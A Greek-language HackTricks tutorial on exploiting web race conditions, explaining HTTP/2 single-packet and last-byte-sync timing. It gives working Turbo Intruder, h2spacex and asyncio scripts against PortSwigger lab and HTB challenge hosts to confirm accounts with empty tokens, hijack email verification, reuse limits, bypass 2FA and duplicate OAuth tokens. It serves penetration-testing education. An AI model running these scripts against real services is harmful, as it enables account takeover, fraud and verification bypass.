# Race Condition

{{#include ../banners/hacktricks-training.md}}

> [!WARNING]
> Για να αποκτήσετε βαθιά κατανόηση αυτής της τεχνικής δείτε την πρωτότυπη αναφορά στο [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)

## Ενίσχυση επιθέσεων Race Condition

Το κύριο εμπόδιο στο να εκμεταλλευτεί κανείς race conditions είναι να εξασφαλίσει ότι πολλαπλά αιτήματα (requests) χειρίζονται ταυτόχρονα, με πολύ μικρή διαφορά στους χρόνους επεξεργασίας — ιδανικά, λιγότερο από 1ms.

Εδώ θα βρείτε μερικές τεχνικές για τον συγχρονισμό αιτημάτων:

#### HTTP/2 Single-Packet Attack vs. HTTP/1.1 Last-Byte Synchronization

- **HTTP/2**: Υποστηρίζει την αποστολή δύο αιτημάτων πάνω από μία TCP σύνδεση, μειώνοντας τον αντίκτυπο του network jitter. Ωστόσο, λόγω παραλλαγών στην πλευρά του server, δύο αιτήματα ενδέχεται να μην αρκούν για συνεπή race condition exploit.
- **HTTP/1.1 'Last-Byte Sync'**: Επιτρέπει το προ-αποστολή των περισσότερων τμημάτων 20-30 αιτημάτων, κρατώντας ένα μικρό τεμάχιο, το οποίο στη συνέχεια αποστέλλεται μαζί, επιτυγχάνοντας ταυτόχρονη άφιξη στον server.

Η προετοιμασία για Last-Byte Sync περιλαμβάνει:

1. Αποστολή των headers και του body μείον το τελικό byte, χωρίς να τερματιστεί το stream.
2. Παύση για 100ms μετά την αρχική αποστολή.
3. Απενεργοποίηση του TCP_NODELAY για να χρησιμοποιηθεί ο αλγόριθμος Nagle και να ομαδοποιηθούν τα τελικά frames.
4. Αποστολή ping για να προθερμανθεί η σύνδεση.

Η μετέπειτα αποστολή των κρατημένων frames θα πρέπει να οδηγήσει στην άφιξή τους σε ένα πακέτο, ελέγξιμη μέσω Wireshark. Αυτή η μέθοδος δεν εφαρμόζεται σε static files, τα οποία συνήθως δεν εμπλέκονται σε RC attacks.

### Προσαρμογή στην Αρχιτεκτονική του Server

Η κατανόηση της αρχιτεκτονικής του στόχου είναι κρίσιμη. Front-end servers μπορεί να δρομολογούν αιτήματα διαφορετικά, επηρεάζοντας το timing. Η προκαταβολική server-side connection warming μέσω ασήμαντων requests μπορεί να εξομαλύνει τους χρόνους των αιτημάτων.

#### Αντιμετώπιση κλειδώματος βάσει συνεδρίας

Frameworks όπως o PHP session handler σειριοποιούν τα αιτήματα ανά session, πιθανώς αποκρύπτοντας ευπάθειες. Η χρήση διαφορετικών session tokens για κάθε αίτημα μπορεί να παρακάμψει αυτό το πρόβλημα.

#### Υπέρβαση ορίων ρυθμού ή πόρων

Αν η προθέρμανση σύνδεσης είναι αναποτελεσματική, η πρόκληση καθυστερήσεων λόγω ορίων ρυθμού ή πόρων στους web servers, μέσω μιας πλημμύρας από dummy requests, μπορεί να διευκολύνει την single-packet attack προκαλώντας server-side καθυστέρηση ευνοϊκή για race conditions.

## Παραδείγματα Επιθέσεων

- **Tubo Intruder - HTTP2 single-packet attack (1 endpoint)**: Μπορείτε να στείλετε το request στο Turbo Intruder (`Extensions` -> `Turbo Intruder` -> `Send to Turbo Intruder`), μπορείτε να αλλάξετε στο request την τιμή που θέλετε να brute force για **`%s`** όπως στο `csrf=Bn9VQB8OyefIs3ShR2fPESR0FzzulI1d&username=carlos&password=%s` και στη συνέχεια να επιλέξετε το **`examples/race-single-packer-attack.py`** από το drop down:

<figure><img src="../images/image (57).png" alt=""><figcaption></figcaption></figure>

Αν σκοπεύετε να **στείλετε διαφορετικές τιμές**, μπορείτε να τροποποιήσετε τον κώδικα με αυτόν που χρησιμοποιεί μια wordlist από το clipboard:
```python
passwords = wordlists.clipboard
for password in passwords:
engine.queue(target.req, password, gate='race1')
```
> [!WARNING]
> Εάν ο ιστότοπος δεν υποστηρίζει HTTP2 (μόνο HTTP1.1), χρησιμοποιήστε `Engine.THREADED` ή `Engine.BURP` αντί για `Engine.BURP2`.

- **Tubo Intruder - HTTP2 single-packet attack (Several endpoints)**: Σε περίπτωση που χρειάζεται να στείλετε ένα αίτημα σε 1 endpoint και στη συνέχεια πολλά σε άλλα endpoints για να ενεργοποιήσετε το RCE, μπορείτε να αλλάξετε το `race-single-packet-attack.py` script με κάτι σαν:
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=1,
engine=Engine.BURP2
)

# Hardcode the second request for the RC
confirmationReq = '''POST /confirm?token[]= HTTP/2
Host: 0a9c00370490e77e837419c4005900d0.web-security-academy.net
Cookie: phpsessionid=MpDEOYRvaNT1OAm0OtAsmLZ91iDfISLU
Content-Length: 0

'''

# For each attempt (20 in total) send 50 confirmation requests.
for attempt in range(20):
currentAttempt = str(attempt)
username = 'aUser' + currentAttempt

# queue a single registration request
engine.queue(target.req, username, gate=currentAttempt)

# queue 50 confirmation requests - note that this will probably sent in two separate packets
for i in range(50):
engine.queue(confirmationReq, gate=currentAttempt)

# send all the queued requests for this attempt
engine.openGate(currentAttempt)
```
- Επίσης είναι διαθέσιμο στο **Repeater** μέσω της νέας επιλογής '**Send group in parallel**' στο Burp Suite.
- Για **limit-overrun** μπορείτε απλώς να προσθέσετε **το ίδιο request 50 φορές** στην ομάδα.
- Για **connection warming**, μπορείτε να **προσθέσετε** στην **αρχή** της **ομάδας** μερικά **requests** προς κάποιο μη στατικό μέρος του web server.
- Για **delaying** της διαδικασίας **μεταξύ** της επεξεργασίας **ενός request και ενός άλλου** σε 2 substates βήματα, μπορείτε να **προσθέσετε επιπλέον requests ανάμεσα** στα δύο requests.
- Για ένα **multi-endpoint** RC μπορείτε να ξεκινήσετε στέλνοντας το **request** που **πηγαίνει στην hidden state** και μετά **50 requests** αμέσως μετά το οποίο **εκμεταλλεύεται την hidden state**.

<figure><img src="../images/image (58).png" alt=""><figcaption></figcaption></figure>

- **Automated python script**: Ο στόχος αυτού του script είναι να αλλάξει το email ενός χρήστη ενώ συνεχώς το επαληθεύει μέχρι ο verification token του νέου email να φτάσει στο τελευταίο email (αυτό συμβαίνει επειδή στον κώδικα εμφανιζόταν ένα RC όπου ήταν δυνατό να τροποποιηθεί ένα email αλλά η επαλήθευση να αποστέλλεται στο παλιό, επειδή η μεταβλητή που υποδεικνύει το email είχε ήδη συμπληρωθεί με το πρώτο).\
Όταν η λέξη "objetivo" βρεθεί στα ληφθέντα emails ξέρουμε ότι λάβαμε το verification token του αλλαγμένου email και τερματίζουμε την επίθεση.
```python
# https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
# Script from victor to solve a HTB challenge
from h2spacex import H2OnTlsConnection
from time import sleep
from h2spacex import h2_frames
import requests

cookie="session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiZXhwIjoxNzEwMzA0MDY1LCJhbnRpQ1NSRlRva2VuIjoiNDJhMDg4NzItNjEwYS00OTY1LTk1NTMtMjJkN2IzYWExODI3In0.I-N93zbVOGZXV_FQQ8hqDMUrGr05G-6IIZkyPwSiiDg"

# change these headers

headersObjetivo= """accept: */*
content-type: application/x-www-form-urlencoded
Cookie: """+cookie+"""
Content-Length: 112
"""

bodyObjetivo = 'email=objetivo%40apexsurvive.htb&username=estes&fullName=test&antiCSRFToken=42a08872-610a-4965-9553-22d7b3aa1827'

headersVerification= """Content-Length: 1
Cookie: """+cookie+"""
"""
CSRF="42a08872-610a-4965-9553-22d7b3aa1827"

host = "94.237.56.46"
puerto =39697


url = "https://"+host+":"+str(puerto)+"/email/"

response = requests.get(url, verify=False)


while "objetivo" not in response.text:

urlDeleteMails = "https://"+host+":"+str(puerto)+"/email/deleteall/"

responseDeleteMails = requests.get(urlDeleteMails, verify=False)
#print(response.text)
# change this host name to new generated one

Headers = { "Cookie" : cookie, "content-type": "application/x-www-form-urlencoded" }
data="email=test%40email.htb&username=estes&fullName=test&antiCSRFToken="+CSRF
urlReset="https://"+host+":"+str(puerto)+"/challenge/api/profile"
responseReset = requests.post(urlReset, data=data, headers=Headers, verify=False)

print(responseReset.status_code)

h2_conn = H2OnTlsConnection(
hostname=host,
port_number=puerto
)

h2_conn.setup_connection()

try_num = 100

stream_ids_list = h2_conn.generate_stream_ids(number_of_streams=try_num)

all_headers_frames = []  # all headers frame + data frames which have not the last byte
all_data_frames = []  # all data frames which contain the last byte


for i in range(0, try_num):
last_data_frame_with_last_byte=''
if i == try_num/2:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(  # noqa: E501
method='POST',
headers_string=headersObjetivo,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=bodyObjetivo,
path='/challenge/api/profile'
)
else:
header_frames_without_last_byte, last_data_frame_with_last_byte = h2_conn.create_single_packet_http2_post_request_frames(
method='GET',
headers_string=headersVerification,
scheme='https',
stream_id=stream_ids_list[i],
authority=host,
body=".",
path='/challenge/api/sendVerification'
)

all_headers_frames.append(header_frames_without_last_byte)
all_data_frames.append(last_data_frame_with_last_byte)


# concatenate all headers bytes
temp_headers_bytes = b''
for h in all_headers_frames:
temp_headers_bytes += bytes(h)

# concatenate all data frames which have last byte
temp_data_bytes = b''
for d in all_data_frames:
temp_data_bytes += bytes(d)

h2_conn.send_bytes(temp_headers_bytes)

# wait some time
sleep(0.1)

# send ping frame to warm up connection
h2_conn.send_ping_frame()

# send remaining data frames
h2_conn.send_bytes(temp_data_bytes)

resp = h2_conn.read_response_from_socket(_timeout=3)
frame_parser = h2_frames.FrameParser(h2_connection=h2_conn)
frame_parser.add_frames(resp)
frame_parser.show_response_of_sent_requests()

print('---')

sleep(3)
h2_conn.close_connection()

response = requests.get(url, verify=False)
```
#### Turbo Intruder: σημειώσεις για engine και gating

- Engine selection: χρησιμοποίησε `Engine.BURP2` σε στόχους HTTP/2 για να προκαλέσεις το single‑packet attack; εναλλακτικά στρέψου σε `Engine.THREADED` ή `Engine.BURP` για HTTP/1.1 last‑byte sync.
- `gate`/`openGate`: τοποθέτησε σε ουρά πολλές αντιγραφές με `gate='race1'` (ή per‑attempt gates), που αναστέλλει το tail κάθε request· `openGate('race1')` εκκενώνει όλα τα tails μαζί ώστε να φτάσουν σχεδόν ταυτόχρονα.
- Diagnostics: οι αρνητικές χρονοσφραγίδες στο Turbo Intruder υποδεικνύουν ότι ο server απάντησε πριν το request σταλεί πλήρως, αποδεικνύοντας την επικάλυψη. Αυτό είναι αναμενόμενο σε πραγματικές race conditions.
- Connection warming: στείλε ένα ping ή μερικά harmless requests αρχικά για να σταθεροποιήσεις τα timings· προαιρετικά απενεργοποίησε το `TCP_NODELAY` για να ενθαρρύνεις το batching των τελικών frames.


### Βελτίωση του Single Packet Attack

Στην αρχική έρευνα εξηγείται ότι αυτή η επίθεση έχει όριο 1.500 bytes. Ωστόσο, στο [**this post**](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/), εξηγείται πώς είναι δυνατόν να επεκταθεί ο περιορισμός των 1.500 byte του single packet attack στο **65,535 B window limitation του TCP by using IP layer fragmentation** (διαχωρίζοντας ένα πακέτο σε πολλαπλά IP packets) και αποστέλλοντάς τα με διαφορετική σειρά, επιτρέποντας να αποτραπεί η ανασύνθεση του πακέτου μέχρι όλα τα fragments να φτάσουν στον server. Αυτή η τεχνική επέτρεψε στον ερευνητή να στείλει 10.000 requests σε περίπου 166ms.

Σημείωσε ότι παρόλο που αυτή η βελτίωση κάνει την επίθεση πιο αξιόπιστη σε RC που απαιτούν εκατοντάδες/χιλιάδες πακέτων να φτάσουν ταυτόχρονα, μπορεί επίσης να έχει κάποιους περιορισμούς στο λογισμικό. Κάποιοι δημοφιλείς HTTP servers όπως Apache, Nginx και Go έχουν ένα αυστηρό `SETTINGS_MAX_CONCURRENT_STREAMS` σε 100, 128 και 250. Ωστόσο, άλλοι όπως NodeJS και nghttp2 το έχουν απεριόριστο.\
Αυτό βασικά σημαίνει ότι ο Apache θα θεωρήσει μόνο 100 HTTP connections από μία TCP connection (περιορίζοντας αυτή την RC attack).

Μπορείς να βρεις μερικά παραδείγματα που χρησιμοποιούν αυτή την τεχνική στο repo [https://github.com/Ry0taK/first-sequence-sync/tree/main](https://github.com/Ry0taK/first-sequence-sync/tree/main).

## Raw BF

Πριν την προηγούμενη έρευνα, αυτά ήταν μερικά payloads που χρησιμοποιούνταν και απλά προσπαθούσαν να στείλουν τα πακέτα όσο το δυνατόν πιο γρήγορα για να προκαλέσουν RC.

- **Repeater:** Δες τα παραδείγματα από την προηγούμενη ενότητα.
- **Intruder**: Στείλε το **request** στο **Intruder**, ορίστε τον **number of threads** σε **30** μέσα στο **Options menu**, επιλέξτε ως payload **Null payloads** και δημιούργησε **30**.
- **Turbo Intruder**
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
pipeline=False
)
a = ['Session=<session_id_1>','Session=<session_id_2>','Session=<session_id_3>']
for i in range(len(a)):
engine.queue(target.req,a[i], gate='race1')
# open TCP connections and send partial requests
engine.start(timeout=10)
engine.openGate('race1')
engine.complete(timeout=60)

def handleResponse(req, interesting):
table.add(req)
```
- **Python - asyncio**
```python
import asyncio
import httpx

async def use_code(client):
resp = await client.post(f'http://victim.com', cookies={"session": "asdasdasd"}, data={"code": "123123123"})
return resp.text

async def main():
async with httpx.AsyncClient() as client:
tasks = []
for _ in range(20): #20 times
tasks.append(asyncio.ensure_future(use_code(client)))

# Get responses
results = await asyncio.gather(*tasks, return_exceptions=True)

# Print results
for r in results:
print(r)

# Async2sync sleep
await asyncio.sleep(0.5)
print(results)

asyncio.run(main())
```
## **RC Methodology**

### Limit-overrun / TOCTOU

Αυτός είναι ο πιο βασικός τύπος race condition όπου υπάρχουν **vulnerabilities** που **εμφανίζονται** σε σημεία που **περιορίζουν τον αριθμό φορών που μπορείς να εκτελέσεις μια ενέργεια**. Όπως η χρήση του ίδιου discount code σε ένα web store πολλές φορές. Ένα πολύ απλό παράδειγμα βρίσκεται σε [**this report**](https://medium.com/@pravinponnusamy/race-condition-vulnerability-found-in-bug-bounty-program-573260454c43) ή σε [**this bug**](https://hackerone.com/reports/759247)**.**

Υπάρχουν πολλές παραλλαγές αυτού του είδους επίθεσης, μεταξύ άλλων:

- Εξαργύρωση ενός gift card πολλαπλές φορές
- Βαθμολόγηση ενός προϊόντος πολλές φορές
- Ανάληψη ή μεταφορά χρημάτων πάνω από το account balance του λογαριασμού
- Επαναχρήση της ίδιας CAPTCHA λύσης
- Παράκαμψη ενός anti-brute-force rate limit

### **Hidden substates**

Η εκμετάλλευση περίπλοκων race conditions συχνά περιλαμβάνει την εκμετάλλευση σύντομων ευκαιριών για αλληλεπίδραση με hidden ή **unintended machine substates**. Εδώ είναι πώς να το προσεγγίσετε:

1. **Identify Potential Hidden Substates**
- Ξεκινήστε εντοπίζοντας endpoints που τροποποιούν ή αλληλεπιδρούν με κρίσιμα δεδομένα, όπως user profiles ή password reset processes. Επικεντρωθείτε σε:
- **Storage**: Προτιμήστε endpoints που χειρίζονται server-side persistent data αντί για εκείνα που διαχειρίζονται δεδομένα client-side.
- **Action**: Αναζητήστε operations που τροποποιούν υπάρχοντα δεδομένα, καθώς είναι πιο πιθανό να δημιουργήσουν exploitable conditions σε σύγκριση με αυτές που προσθέτουν νέα δεδομένα.
- **Keying**: Επιτυχημένες επιθέσεις συνήθως αφορούν operations που είναι keyed στο ίδιο identifier, π.χ. username ή reset token.
2. **Conduct Initial Probing**
- Δοκιμάστε τα εντοπισμένα endpoints με race condition attacks, παρατηρώντας τυχόν αποκλίσεις από τα αναμενόμενα αποτελέσματα. Unexpected responses ή αλλαγές στη συμπεριφορά της εφαρμογής μπορεί να υποδηλώνουν vulnerability.
3. **Demonstrate the Vulnerability**
- Περιορίστε την επίθεση στον ελάχιστο αριθμό requests που χρειάζονται για να exploit το vulnerability, συχνά μόνο δύο. Αυτό το βήμα μπορεί να απαιτήσει πολλαπλές προσπάθειες ή αυτοματοποίηση λόγω της ακριβούς χρονισμού.

### Time Sensitive Attacks

Η ακρίβεια στον χρονισμό των requests μπορεί να αποκαλύψει vulnerabilities, ιδιαίτερα όταν χρησιμοποιούνται προβλέψιμες μέθοδοι όπως timestamps για security tokens. Για παράδειγμα, η δημιουργία password reset tokens με βάση timestamps μπορεί να επιτρέψει identical tokens για ταυτόχρονες requests.

**To Exploit:**

- Χρησιμοποιήστε ακριβή χρονισμό, όπως single packet attack, για να στείλετε concurrent password reset requests. Identical tokens υποδεικνύουν vulnerability.

**Example:**

- Ζητήστε δύο password reset tokens ταυτόχρονα και συγκρίνετέ τα. Matching tokens προτείνουν σφάλμα στη δημιουργία των token.

**Δείτε** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-exploiting-time-sensitive-vulnerabilities) **για να το δοκιμάσετε.**

## Hidden substates case studies

### Pay & add an Item

Δείτε αυτό το [**PortSwigger Lab**](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-insufficient-workflow-validation) για να δείτε πώς να **pay** σε ένα store και **add an extra** item που **δεν θα χρειαστεί να το πληρώσετε**.

### Confirm other emails

Η ιδέα είναι να **verify an email address and change it to a different one at the same time** για να διαπιστώσετε αν η πλατφόρμα επαληθεύει το νέο email.

### Change email to 2 emails addresses Cookie based

Σύμφωνα με [**this research**](https://portswigger.net/research/smashing-the-state-machine) το Gitlab ήταν ευάλωτο σε takeover με αυτόν τον τρόπο επειδή μπορεί να **στέλνει** το **email verification token ενός email στο άλλο email**.

**Δείτε** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-single-endpoint) **για να το δοκιμάσετε.**

### Hidden Database states / Confirmation Bypass

Εάν **2 διαφορετικά writes** χρησιμοποιούνται για να **add** **information** μέσα σε μια **database**, υπάρχει ένα μικρό χρονικό διάστημα όπου **μόνο τα πρώτα δεδομένα έχουν γραφτεί** μέσα στη database. Για παράδειγμα, όταν δημιουργείται ένας χρήστης, το **username** και το **password** μπορεί να **γραφτούν** και **μετά το token** για την επιβεβαίωση του νέου λογαριασμού να γραφτεί. Αυτό σημαίνει ότι για ένα μικρό χρονικό διάστημα το **token για την επιβεβαίωση ενός λογαριασμού είναι null**.

Επομένως, **η εγγραφή ενός account και η αποστολή πολλαπλών requests με ένα κενό token** (`token=` ή `token[]=` ή οποιαδήποτε άλλη παραλλαγή) για άμεση επιβεβαίωση του λογαριασμού μπορεί να επιτρέψει να **confirm έναν λογαριασμό** που δεν ελέγχετε το email.

**Δείτε** [**PortSwigger Lab**](https://portswigger.net/web-security/race-conditions/lab-race-conditions-partial-construction) **για να το δοκιμάσετε.**

### Bypass 2FA

Το ακόλουθο pseudo-code είναι ευάλωτο σε race condition επειδή για ένα πολύ μικρό χρονικό διάστημα η **2FA is not enforced** ενώ δημιουργείται η session:
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 μόνιμη διατήρηση

Υπάρχουν αρκετοί [**OAUth providers**](https://en.wikipedia.org/wiki/List_of_OAuth_providers). Αυτές οι υπηρεσίες σας επιτρέπουν να δημιουργήσετε μια εφαρμογή και να αυθεντικοποιήσετε χρήστες που έχει καταχωρήσει ο provider. Για να το κάνετε αυτό, ο **client** θα χρειαστεί να **επιτρέψει στην εφαρμογή σας** να έχει πρόσβαση σε κάποια από τα δεδομένα του μέσα στον **OAUth provider**.\
Άρα, μέχρι εδώ είναι απλώς ένα κοινό login με google/linkedin/github... όπου σας εμφανίζεται μια σελίδα που λέει: "_Application \<InsertCoolName> wants to access you information, do you want to allow it?_"

#### Race Condition in `authorization_code`

Το **πρόβλημα** εμφανίζεται όταν το **αποδεχτείτε** και αυτό αποστέλλει αυτόματα ένα **`authorization_code`** στην κακόβουλη εφαρμογή. Στη συνέχεια, αυτή η **εφαρμογή εκμεταλλεύεται ένα Race Condition στον OAUth service provider για να δημιουργήσει περισσότερα από ένα AT/RT** (_Authentication Token/Refresh Token_) από το **`authorization_code`** για τον λογαριασμό σας. Βασικά, θα εκμεταλλευτεί το γεγονός ότι αποδεχτήκατε την εφαρμογή να έχει πρόσβαση στα δεδομένα σας για να **δημιουργήσει πολλαπλούς λογαριασμούς**. Έτσι, αν **σταματήσετε να επιτρέπετε στην εφαρμογή να έχει πρόσβαση στα δεδομένα σας, ένα ζευγάρι AT/RT θα διαγραφεί, αλλά τα υπόλοιπα θα εξακολουθούν να είναι έγκυρα**.

#### Race Condition in `Refresh Token`

Μόλις έχετε **αποκτήσει ένα έγκυρο RT** μπορείτε να προσπαθήσετε να **το εκμεταλλευτείτε για να δημιουργήσετε πολλαπλά AT/RT** και **ακόμα κι αν ο χρήστης ακυρώσει τα δικαιώματα** για την κακόβουλη εφαρμογή να έχει πρόσβαση στα δεδομένα του, **πολλαπλά RTs θα παραμείνουν έγκυρα.**

## **RC in WebSockets**

- Στο [**WS_RaceCondition_PoC**](https://github.com/redrays-io/WS_RaceCondition_PoC) θα βρείτε ένα PoC σε Java για αποστολή websocket μηνυμάτων **παράλληλα** ώστε να εκμεταλλευτείτε **Race Conditions και σε Web Sockets**.
- Με το Burp’s WebSocket Turbo Intruder μπορείτε να χρησιμοποιήσετε τον engine **THREADED** για να ξεκινήσετε πολλαπλές WS συνδέσεις και να στείλετε payloads παράλληλα. Ξεκινήστε από το επίσημο παράδειγμα και ρυθμίστε τη `config()` (thread count) για concurrency· αυτό είναι συχνά πιο αξιόπιστο από το batching σε μία σύνδεση όταν κάνετε race σε server‑side state ανάμεσα σε WS handlers. Δείτε [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py).

## References

- [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
- [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
- [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
- [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
- [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)
- [https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/](https://flatt.tech/research/posts/beyond-the-limit-expanding-single-packet-race-condition-with-first-sequence-sync/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)

{{#include ../banners/hacktricks-training.md}}
